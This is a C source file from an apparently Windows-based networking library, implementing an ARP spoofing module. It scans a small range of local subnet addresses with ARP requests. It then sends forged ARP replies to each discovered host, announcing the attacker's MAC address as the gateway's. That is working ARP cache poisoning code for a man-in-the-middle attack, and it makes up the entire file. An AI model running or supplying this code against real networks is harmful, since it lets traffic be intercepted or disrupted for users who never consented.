#include <WinSock2.h>
#include "../common/error/udo_error.h"
#include "../common/core/udo_cont.h"
#include "udo_host.h"
#include "udo_adapter.h"
#include "udo_arp.h"
#include "udo_arp_spoofing.h"

void udo_arp_spoofing_init(udo_arp_spoofing* self,struct udo_adapter* adapter)
{
	self->adapter = adapter;
	self->is_run = 0;
	udo_list_init(&self->list);
}

void udo_arp_spoofing_start(udo_arp_spoofing* self)
{
	unsigned int reverse_ip = *((unsigned int*)udo_ip_getnet(udo_adapter_ip(self->adapter)));
	unsigned int mask = inet_addr(udo_adapter_mask(self->adapter));
	reverse_ip = htonl(reverse_ip&mask);
	unsigned int count = htonl(~mask);
	unsigned int host_ip;

	for (unsigned int i = 1; i < 20; ++i)
	{
		++reverse_ip;
		host_ip = htonl(reverse_ip);
		udo_ip ip;
		udo_ip_init(&ip);
		udo_ip_setnet(&ip,(unsigned char*)&host_ip);
		if (!udo_ip_equal(&ip, udo_adapter_gateway(self->adapter)) && !udo_ip_equal(&ip, udo_adapter_ip(self->adapter)))
		{
			udo_arp arp_request;
			udo_arp_init(&arp_request, self->adapter);
			udo_arp_request(&arp_request, &ip);
			udo_arp_term(&arp_request);
		}
		udo_ip_term(&ip);
	}
	
}

void udo_arp_spoofing_stop(udo_arp_spoofing* self)
{
	self->is_run = udo_false;
}

void udo_arp_spoofing_term(udo_arp_spoofing* self)
{
	udo_assert(!self->is_run);
	udo_list_item* it = udo_list_begin(&self->list);
	while (it != udo_list_end(&self->list))
	{
		udo_host* host = udo_cont(udo_host, item, it);
		udo_list_item* pre = it;
		it = udo_list_next(&self->list, it);
		udo_host_term(host);
		free(host);
	}
	udo_list_term(&self->list);
}

void udo_arp_spoofing_addhost(udo_arp_spoofing* self, struct udo_host* host)
{
	udo_list_item* it = udo_list_begin(&self->list);
	udo_host* add_host = udo_null;
	for (; it != udo_list_end(&self->list); it = udo_list_next(&self->list, it))
	{
		if (udo_host_equal(udo_cont(udo_host, item, it), host))
		{
			return;
		}
	}
	add_host = (udo_host*)malloc(sizeof(udo_host));
	udo_host_init(add_host);
	udo_host_copy(add_host, host);
	udo_list_insert(&self->list, &add_host->item, it);
}

void udo_arp_spoofing_exec(udo_arp_spoofing* self)
{
	udo_host* host = udo_null;
	udo_list_item* it = udo_list_begin(&self->list);
	for (; it != udo_list_end(&self->list); it = udo_list_next(&self->list, it))
	{
		host = udo_cont(udo_host, item, it);
		udo_arp response;
		udo_arp_init(&response, self->adapter);
		udo_arp_setop(&response, UDO_ARP_RESPONSE);
		udo_arp_setsma(&response, udo_adapter_mac(self->adapter));
		udo_arp_setsia(&response, udo_adapter_gateway(self->adapter));
		udo_arp_setdma(&response, udo_host_getmac(host));
		udo_arp_setdia(&response, udo_host_getip(host));
		udo_arp_resonse(&response);
		udo_arp_term(&response);
	}
}

int udo_arp_spoofing_isrun(udo_arp_spoofing* self)
{
	return self->is_run;
}

void udo_arp_spoofing_run(udo_arp_spoofing* self)
{
	self->is_run = udo_ture;
}




